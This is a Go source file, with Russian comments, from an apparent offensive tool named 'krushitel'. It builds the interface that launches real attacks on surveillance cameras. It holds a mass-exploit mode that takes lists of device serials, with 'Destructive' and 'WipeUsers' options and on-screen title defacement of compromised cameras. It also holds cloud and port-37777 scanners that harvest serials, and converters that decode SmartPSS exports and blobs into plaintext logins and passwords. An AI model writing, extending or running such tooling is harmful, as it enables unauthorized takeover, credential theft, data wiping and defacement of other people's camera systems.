package ui

// modes.go — сборка форм режимов + запуск РЕАЛЬНЫХ движков krushitel
// (exploit/scanner/cloud/xmlde/ironscan). Никаких симуляций.

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode/utf8"

	"krushitel/cloud"
	"krushitel/dhip"
	"krushitel/exploit"
	"krushitel/fwd"
	"krushitel/ironscan"
	"krushitel/scanner"
	"krushitel/smartpss"
	"krushitel/xmlde"
)

// ── режим 1: крушим ──────────────────────────────────────────────────

func exploitForm() *formState {
	f := newFormState(tr("нужна кое какая информация"), func(m *model) {
		startExploitRun(m)
	})
	f.addStr(tr("файл с серийниками (targets.txt)"), true, true)
	if cfg.LastInput != "" {
		f.setDefault(cfg.LastInput) // сохранение последнего захода
	}
	f.addStr(tr("папка для результатов"), true, false)
	if cfg.LastOut != "" {
		f.setDefault(cfg.LastOut)
	}
	// 30 — рабочий дефолт: 200 одновременных handshake'ов глушат друг
	// друга (датаграммы роняются, туннели ловят stall). Больше = не
	// быстрее, проверено: при 20 потоках hit-rate вдвое выше.
	defThreads := 30
	if cfg.LastThreads > 0 {
		defThreads = cfg.LastThreads
	}
	f.addInt(tr("потоков"), defThreads)
	f.addBool(tr("снапы?"), cfg.Snaps)
	f.addBool("autogen .xml?", cfg.XML)
	f.addBool(tr("пре-флайт?"), cfg.Preflight)
	return f
}

func startExploitRun(m *model) {
	RememberRun(m.form.fields[0].strVal, m.form.fields[1].strVal, m.threadsVal(30))
	inFile := m.form.fields[0].strVal
	outDir := m.form.fields[1].strVal
	threads := m.threadsVal(2)
	cfg.Snaps = m.form.fields[3].boolVal
	cfg.XML = m.form.fields[4].boolVal
	cfg.Preflight = m.form.fields[5].boolVal
	saveSettings()

	serials, err := exploit.LoadSerials(inFile)
	if err != nil {
		showMsg(m, tr("скан sn"), red("[-] "+tr("ошибка открытия выходного файла: ")+err.Error()))
		return
	}
	if len(serials) == 0 {
		showMsg(m, tr("крушим"), red("[-] "+tr("Файл пуст")))
		return
	}

	// Resume: в папке остался живой session-маркер (краш/esc прошлого
	// прогона) и ведомость done.txt. Предлагаем продолжить с оставшихся;
	// отказ — прогон заново (done.txt перезапишется движком).
	if sess := readExploitSession(outDir); sess != nil {
		done := readDoneSet(filepath.Join(outDir, exploit.DoneFile))
		if len(done) > 0 {
			remaining := make([]string, 0, len(serials))
			for _, s := range serials {
				if _, ok := done[s]; !ok {
					remaining = append(remaining, s)
				}
			}
			confirm := newFormState(tr("крушим"), func(m *model) {
				if m.form.fields[0].boolVal {
					launchExploitRun(m, inFile, outDir, threads, remaining, true, false)
				} else {
					launchExploitRun(m, inFile, outDir, threads, serials, false, false)
				}
			})
			confirm.addBool(fmt.Sprintf(tr("прерванный прогон (%s): отработано %d, осталось %d. продолжить с оставшихся? (нет = заново)"),
				sess.InFile, len(done), len(remaining)), true)
			confirm.cur = 0
			m.form = confirm
			m.form.focus()
			return
		}
	}
	launchExploitRun(m, inFile, outDir, threads, serials, false, false)
}

// exploitSession — содержимое krushitel_session.json: маркер живого
// прогона в папке результатов. Пишется при старте, движок удаляет при
// чистом завершении (остался после краша = есть что продолжать).
type exploitSession struct {
	InFile  string `json:"in_file"`
	Threads int    `json:"threads"`
	Total   int    `json:"total"`
	Started string `json:"started"`
}

func readExploitSession(outDir string) *exploitSession {
	data, err := os.ReadFile(filepath.Join(outDir, exploit.SessionFile))
	if err != nil {
		return nil
	}
	var s exploitSession
	if json.Unmarshal(data, &s) != nil || s.InFile == "" {
		return nil
	}
	return &s
}

// readDoneSet — множество отработанных серийников из ведомости.
func readDoneSet(path string) map[string]struct{} {
	out := make(map[string]struct{})
	data, err := os.ReadFile(path)
	if err != nil {
		return out
	}
	for _, line := range strings.Split(string(data), "\n") {
		if s := ironscan.SanitizeSerial(line); s != "" {
			out[s] = struct{}{}
		}
	}
	return out
}

func launchExploitRun(m *model, inFile, outDir string, threads int, serials []string, resume, triedSudo bool) {
	// Префлайт ДО переворота в stRun: папка результатов (+ xml-подпапка,
	// если импорт включён — это ровно тот кейс «включил в настройках,
	// а xml нет»). Фатал → красный диалог (sudo / проводник).
	probeDirs := []string{outDir}
	if cfg.XML {
		probeDirs = append(probeDirs, filepath.Join(outDir, "xml"))
	}
	for _, d := range probeDirs {
		if err := preflightDir(d); err != nil {
			fatalFileDialog(m, tr("крушим)"), err, d, triedSudo, true,
				func() { launchExploitRun(m, inFile, outDir, threads, serials, resume, true) },
				func(newPath string) {
					launchExploitRun(m, inFile, newPath, threads, serials, false, false)
				})
			return
		}
	}
	stats := &exploit.Stats{}
	// на экране прогона — боевой заголовок, «need some info» остаётся
	// только на форме ввода
	r := newRunState(runExploit, tr("крушим)"))
	r.exp = stats
	// лог прогона — в папку результатов (append между прогонами)
	r.openLog(filepath.Join(outDir, "log.txt"))
	// Глобальный лимит одновременных P2P-init'ов: oluhradar держит
	// min(workers,100) хендшейков с одного IP и облако это терпит —
	// 24 было слишком тесно, очередь пробками вставала.
	fwd.InitLimit = 100
	ctx, cancel := context.WithCancel(context.Background())
	r.cancel = cancel
	m.form = nil
	m.run = r
	m.state = stRun

	// session-маркер: живёт до чистого завершения прогона (движок
	// удалит), краш/esc — файл остаётся, следующий старт предложит resume
	sess := exploitSession{
		InFile:  inFile,
		Threads: threads,
		Total:   len(serials),
		Started: time.Now().Format("02.01.2006 15:04:05"),
	}
	if b, err := json.Marshal(sess); err == nil {
		_ = os.WriteFile(filepath.Join(outDir, exploit.SessionFile), b, 0644)
	}

	// Логирование: пишем АБСОЛЮТНО ВСЁ сетевое взаимодействие в log.txt
	logLine := func(line string) {
		r.writeLog(line)
		if cfg.Debug {
			select {
			case r.eventsCh <- "[dbg] " + line:
			default:
			}
		}
	}
	fwd.Debug = cfg.Debug
	fwd.LogHook = logLine
	cloud.LogHook = logLine
	dhip.LogHook = func(format string, args ...any) {
		logLine(fmt.Sprintf(format, args...))
	}
	exploit.LogHook = func(format string, args ...any) {
		logLine(fmt.Sprintf(format, args...))
	}

	opts := exploit.Opts{
		OutDir:      outDir,
		Snaps:       cfg.Snaps,
		XML:         cfg.XML,
		Titles:      cfg.Titles,
		ChanText:    cfg.ChannelText,
		CustomTexts: cfg.CustomTexts[:],
		DummyLogin:  cfg.DummyLogin,
		DummyPass:   cfg.DummyPass,
		Preflight:   cfg.Preflight,
		Resume:      resume,
		Destructive: cfg.Destructive,
		WipeUsers:   cfg.WipeUsers,
	}

	go func() {
		defer func() {
			fwd.LogHook = nil
			cloud.LogHook = nil
			dhip.LogHook = nil
			exploit.LogHook = nil
		}()
		exploit.RunExploit(ctx, serials, outDir, threads, opts, stats, r.eventsCh)
	}()
}

// ── режим 2: титры по списку ─────────────────────────────────────────

func titlesForm() *formState {
	f := newFormState(tr("OSDChanger"), func(m *model) {
		startTitlesRun(m)
	})
	f.addStr(tr("файл с камерами (results.txt)"), true, true)
	// 200 — пост-обработка: init-воронка (InitLimit=100) сама ограничит
	// одновременные хендшейки, воркеров можно много
	f.addInt(tr("потоков"), 200)
	return f
}

func startTitlesRun(m *model) {
	inFile := m.form.fields[0].strVal
	threads := m.threadsVal(1)

	cams, skipped, err := exploit.ParseResultsCreds(inFile)
	if err != nil {
		showMsg(m, tr("OSDChanger"), red("[-] "+tr("ошибка чтения входного файла: ")+err.Error()))
		return
	}
	if len(cams) == 0 {
		showMsg(m, tr("OSDChanger"), red("[-] "+tr("Файл пуст")))
		return
	}

	launchTitlesRun(m, inFile, threads, cams, skipped)
}

func launchTitlesRun(m *model, inFile string, threads int, cams []exploit.CamCred, skipped int) {
	stats := &exploit.TitlesStats{}
	r := newRunState(runTitles, tr("OSDChanger"))
	r.ttl = stats
	// лог — рядом с входным файлом: results.txt → results_titles.log
	r.openLog(strings.TrimSuffix(inFile, filepath.Ext(inFile)) + "_titles.log")

	ctx, cancel := context.WithCancel(context.Background())
	r.cancel = cancel
	m.form = nil
	m.run = r
	m.state = stRun

	if skipped > 0 {
		line := fmt.Sprintf(tr("[!] пропущено строк мимо формата: %d"), skipped)
		r.writeLog(line)
		r.eventsCh <- line
	}

	opts := exploit.Opts{
		Titles:      true,
		ChanText:    cfg.ChannelText,
		CustomTexts: cfg.CustomTexts[:],
	}

	go exploit.RunTitles(ctx, cams, threads, opts, stats, r.eventsCh)
}

// ── режим 2: скан префиксов (без генерации файлов) ───────────────────
// Префиксы из файла разворачиваются в 00000..FFFFF на лету окнами по
// свободной RAM и льются straight в скан-пайплайн. Промежуточных
// многогигабайтных файлов нет.

func prefixSingleScanForm() *formState {
	f := newFormState(tr("скан одного префикса"), func(m *model) {
		startPrefixSingleScanRun(m)
	})
	f.addStr(tr("префикс (10 символов)"), true, false)
	f.fields[0].validate = func(s string) string {
		s = strings.TrimSpace(s)
		if s == "" {
			return tr("обязательное поле")
		}
		if utf8.RuneCountInString(s) < 10 {
			return tr("префикс должен быть не менее 10 символов")
		}
		return ""
	}
	f.addStr(tr("выходной файл (только онлайн)"), true, false)
	f.addInt(tr("потоков"), 30)
	return f
}

func startPrefixSingleScanRun(m *model) {
	prefixRaw := strings.TrimSpace(m.form.fields[0].strVal)
	if utf8.RuneCountInString(prefixRaw) < 10 {
		showMsg(m, tr("скан префикса"), red("[-] "+tr("префикс должен быть не менее 10 символов")))
		return
	}
	prefix := strings.ToUpper(string([]rune(prefixRaw)[:10]))
	outFile := m.form.fields[1].strVal
	threads := m.threadsVal(2)

	startPrefixRunCommon(m, []string{prefix}, outFile, threads, tr("скан префикса"))
}

func prefixFileScanForm() *formState {
	f := newFormState(tr("скан файла с префиксами"), func(m *model) {
		startPrefixFileScanRun(m)
	})
	f.addStr(tr("файл с префиксами (10 символов)"), true, true)
	f.addStr(tr("выходной файл (только онлайн)"), true, false)
	f.addInt(tr("потоков"), 30)
	return f
}

func startPrefixFileScanRun(m *model) {
	prefixFile := m.form.fields[0].strVal
	outFile := m.form.fields[1].strVal
	threads := m.threadsVal(2)

	prefixes, err := cloud.LoadPrefixes(prefixFile)
	if err != nil || len(prefixes) == 0 {
		msg := tr("нет префиксов в файле (нужно >= 10 символов, берутся первые 10)")
		if err != nil {
			msg = err.Error()
		}
		showMsg(m, tr("скан префиксов"), red("[-] "+msg))
		return
	}
	startPrefixRunCommon(m, prefixes, outFile, threads, tr("скан префиксов"))
}

func prefixScanForm() *formState {
	return prefixFileScanForm()
}

func startPrefixScanRun(m *model) {
	startPrefixFileScanRun(m)
}

func startPrefixRunCommon(m *model, prefixes []string, outFile string, threads int, title string) {
	// Недобитый прогон? Один вопрос — продолжить с чекпоинта.
	// «Нет» = обычный путь (append-вопрос + старт с нуля).
	if resumeInfo, ok := scanner.CheckPrefixResume(outFile); ok {
		confirm := newFormState(title, func(m *model) {
			if m.form.fields[0].boolVal {
				launchPrefixScanRun(m, prefixes, outFile, threads, false, true, false, title)
			} else {
				startPrefixScanFresh(m, prefixes, outFile, threads, title)
			}
		})
		confirm.addBool(resumeInfo, false)
		confirm.cur = 0
		m.form = confirm
		m.form.focus()
		return
	}
	startPrefixScanFresh(m, prefixes, outFile, threads, title)
}

// startPrefixScanFresh — старт с нуля: append-вопрос как в обычном скане,
// если выходной файл уже с результатами.
func startPrefixScanFresh(m *model, prefixes []string, outFile string, threads int, title string) {
	if st, err := os.Stat(outFile); err == nil && st.Size() > 0 {
		lines := countLines(outFile)
		confirm := newFormState(title, func(m *model) {
			launchPrefixScanRun(m, prefixes, outFile, threads, m.form.fields[0].boolVal, false, false, title)
		})
		confirm.addBool(
			fmt.Sprintf(tr("файл %s уже есть (%d строк). дописать в конец? (нет = перезаписать)"), outFile, lines),
			false)
		confirm.cur = 0
		m.form = confirm
		m.form.focus()
		return
	}
	launchPrefixScanRun(m, prefixes, outFile, threads, false, false, false, title)
}

func launchPrefixScanRun(m *model, prefixes []string, outFile string, threads int, appendMode, resume, triedSudo bool, title string) {
	// Префлайт ДО переворота в stRun: сам выходной файл тоже проверяем —
	// иначе «outFile существует как папка» падает уже в движке плоской строкой.
	if err := preflightOutFile(outFile); err != nil {
		fatalFileDialog(m, title, err, filepath.Dir(outFile), triedSudo, false,
			func() { launchPrefixScanRun(m, prefixes, outFile, threads, appendMode, resume, true, title) },
			func(newPath string) {
				launchPrefixScanRun(m, prefixes, newPath, threads, appendMode, resume, false, title)
			})
		return
	}
	stats := &scanner.ScanStats{}
	r := newRunState(runCheck, title)
	r.chk = stats
	// лог скана — рядом с выходным файлом: alive.txt → alive.log
	r.openLog(strings.TrimSuffix(outFile, filepath.Ext(outFile)) + ".log")
	ctx, cancel := context.WithCancel(context.Background())
	r.cancel = cancel
	m.form = nil
	m.run = r
	m.state = stRun

	// Протокольные дампы сканера (dh-fwd-стайл) — как в режиме крушителя.
	logLine := func(line string) {
		r.writeLog(line)
		if cfg.Debug {
			select {
			case r.eventsCh <- "[dbg] " + line:
			default:
			}
		}
	}
	scanner.LogHook = logLine
	scanner.Debug = cfg.Debug

	go func() {
		defer func() { scanner.LogHook = nil }()
		scanner.RunPrefixes(ctx, prefixes, outFile, appendMode, resume, threads, stats, r.eventsCh)
	}()
}

// ── режим 3: smartpss ────────────────────────────────────────────────

func xmlXMLForm() *formState {
	f := newFormState(tr("xml → креды"), func(m *model) {
		inFile := m.form.fields[0].strVal
		outFile := m.form.fields[1].strVal

		data, err := os.ReadFile(inFile)
		if err != nil {
			showMsg(m, tr("xml → креды"), red("[-] "+err.Error()))
			return
		}
		creds, err := xmlde.DecodeXML(data)
		if err != nil || len(creds) == 0 {
			showMsg(m, tr("xml → креды"), red(tr("[!] нет декодированных кредов")))
			return
		}
		var lines []string
		for _, c := range creds {
			lines = append(lines, fmt.Sprintf("%s:%s@%s:%s", c.Username, c.Password, c.Domain, c.Port))
		}
		if err := os.WriteFile(outFile, []byte(strings.Join(lines, "\n")+"\n"), 0644); err != nil {
			showMsg(m, tr("xml → креды"), red("[-] "+err.Error()))
			return
		}
		showMsg(m, tr("xml → креды"),
			green(fmt.Sprintf(tr("[+] %d кред(ов) -> %s"), len(creds), outFile)))
	})
	f.addStr(tr("файл с результатами (SmartPSS export)"), true, true)
	f.addStr(tr("название файла для кредов"), true, false)
	return f
}

func xmlBlobForm() *formState {
	f := newFormState(tr("blob → пароль"), func(m *model) {
		blob := m.form.fields[0].strVal
		plain, err := xmlde.DecodeBlob(blob)
		if err != nil {
			showMsg(m, tr("blob → пароль"), red("[-] "+err.Error()))
			return
		}
		showMsg(m, tr("blob → пароль"), tr("   пароль: ")+green(plain))
	})
	f.addStr(tr("вставь base64 blob"), true, false)
	return f
}

// txt → SmartPSS xml (креды → импорт-файлы для SmartPSS)
func txtXMLForm() *formState {
	f := newFormState(tr("креды → xml"), func(m *model) {
		inFile := m.form.fields[0].strVal
		outFile := m.form.fields[1].strVal

		data, err := os.ReadFile(inFile)
		if err != nil {
			showMsg(m, tr("креды → xml"), red("[-] "+err.Error()))
			return
		}
		creds, skipped := xmlde.ParseCreds(data)
		if len(creds) == 0 {
			showMsg(m, tr("креды → xml"), red(tr("[!] нет разобранных кредов")))
			return
		}
		imports := make([]smartpss.DeviceImport, len(creds))
		for i, c := range creds {
			imports[i] = smartpss.DeviceImport{Serial: c.Domain, Login: c.Username, Password: c.Password}
		}
		files, err := smartpss.WriteXML(outFile, imports)
		if err != nil {
			showMsg(m, tr("креды → xml"), red("[-] "+err.Error()))
			return
		}
		msg := green(fmt.Sprintf(tr("[+] %d камер -> %s"), len(creds), outFile))
		if skipped > 0 {
			msg += yellow(fmt.Sprintf(tr(" (мимо формата: %d)"), skipped))
		}
		if files > 1 {
			msg += dim(fmt.Sprintf(tr(" (%d файла(ов) по 64)"), files))
		}
		showMsg(m, tr("креды → xml"), msg)
	})
	f.addStr(tr("файл с кредами (SN,login:pass)"), true, true)
	f.addStr(tr("выходной xml-файл"), true, false)
	return f
}

// ── режим 5: ищем префиксы ───────────────────────────────────────────

func prefixForm() *formState {
	f := newFormState(tr("префиксы"), func(m *model) {
		startPrefixRun(m)
	})
	f.addStr(tr("IP цели или файл со списком хостов"), true, false)
	f.addInt(tr("порт"), 37777)
	f.addInt(tr("потоков"), 500)
	f.addStr(tr("выходной файл (база, без расширения)"), true, false)
	return f
}

func startPrefixRun(m *model) {
	tgt := m.form.fields[0].strVal
	port := m.form.fields[1].intVal
	threads := m.threadsVal(2)
	outBase := m.form.fields[3].strVal

	var targets []string
	if fileExists(tgt) {
		var err error
		targets, err = ironscan.LoadTargets(tgt)
		if err != nil {
			showMsg(m, tr("префиксы"), red("[-] "+err.Error()))
			return
		}
	} else {
		targets = []string{tgt}
	}
	if len(targets) == 0 {
		showMsg(m, tr("префиксы"), red(tr("[-] файл без хостов :(")))
		return
	}

	r := newRunState(runPrefix, tr("префиксы"))
	r.preTotal = len(targets)
	// лог — рядом с базой: base_prefix.txt / base_serials.txt / base_log.txt
	r.openLog(outBase + "_log.txt")
	// Отмена по esc: ctx пробивает пробы (ironscan.Run ctx-aware).
	ctx, cancel := context.WithCancel(context.Background())
	r.cancel = cancel
	m.form = nil
	m.run = r
	m.state = stRun

	// лог находок + префиксы/серийники в конце — как в старом modePrefix.
	type snModel struct{ sn, model string }
	var mu sync.Mutex
	var found []snModel
	go func() {
		err := ironscan.Run(ctx, ironscan.Options{
			Targets:     targets,
			Port:        port,
			Timeout:     5 * time.Second,
			Concurrency: threads,
			Retries:     2,
		}, func(res ironscan.Result) {
			atomic.AddInt64(&r.preScanned, 1)
			sn := ironscan.SanitizeSerial(res.Serial)
			if sn != "" {
				atomic.AddInt64(&r.preFound, 1)
				mu.Lock()
				found = append(found, snModel{sn, res.Model})
				mu.Unlock()
				line := fmt.Sprintf("[+] %-16s SN: %s", res.Target, sn)
				if res.Model != "" {
					line += tr("  модель: ") + res.Model
				}
				if res.Firmware != "" {
					line += tr("  прошивка: ") + res.Firmware
				}
				select {
				case r.eventsCh <- line:
				default:
				}
			}
		})
		if err != nil {
			r.genErr = err.Error()
		}

		// дедуп по серийнику (модель — первая НЕпустая встретившаяся) → префиксы (первые 10 символов) → файлы.
		mu.Lock()
		uniq := make([]snModel, 0, len(found))
		idx := make(map[string]int)
		for _, e := range found {
			if i, ok := idx[e.sn]; ok {
				// тот же SN с другой IP: апгрейдим пустую модель непустой
				if uniq[i].model == "" && e.model != "" {
					uniq[i].model = e.model
				}
				continue
			}
			idx[e.sn] = len(uniq)
			uniq = append(uniq, e)
		}
		mu.Unlock()
		var prefixes []string
		seenP := make(map[string]struct{})
		for _, e := range uniq {
			if len(e.sn) < 10 {
				continue
			}
			p := e.sn[:10]
			if _, ok := seenP[p]; !ok {
				seenP[p] = struct{}{}
				prefixes = append(prefixes, p)
			}
		}
		if len(uniq) > 0 {
			lines := make([]string, 0, len(uniq))
			for _, e := range uniq {
				if e.model != "" {
					lines = append(lines, e.sn+";"+e.model)
				} else {
					lines = append(lines, e.sn)
				}
			}
			_ = os.WriteFile(outBase+"_serials.txt", []byte(strings.Join(lines, "\n")+"\n"), 0644)
		}
		if len(prefixes) > 0 {
			_ = os.WriteFile(outBase+"_prefix.txt", []byte(strings.Join(prefixes, "\n")+"\n"), 0644)
			select {
			case r.eventsCh <- fmt.Sprintf(tr("[+] серийников: %d, префиксов: %d"), len(uniq), len(prefixes)):
			default:
			}
		}
		atomic.StoreInt64(&r.preDone, 1)
	}()
}

// ── хелперы ──────────────────────────────────────────────────────────

// threadsVal — потоки из формы (вызывать ДО обнуления m.form).
func (m *model) threadsVal(fieldIdx int) int {
	if m.form == nil || fieldIdx >= len(m.form.fields) {
		return 4
	}
	n := m.form.fields[fieldIdx].intVal
	if n < 1 {
		n = 4
	}
	return n
}

// dedup — дедуп с сохранением порядка.
func dedup(in []string) []string {
	seen := make(map[string]struct{})
	out := make([]string, 0, len(in))
	for _, s := range in {
		if _, ok := seen[s]; ok {
			continue
		}
		seen[s] = struct{}{}
		out = append(out, s)
	}
	return out
}

// countLines — число непустых строк файла (0 при ошибке).
func countLines(path string) int {
	f, err := os.Open(path)
	if err != nil {
		return 0
	}
	defer f.Close()
	n := 0
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.TrimSpace(sc.Text()) != "" {
			n++
		}
	}
	return n
}
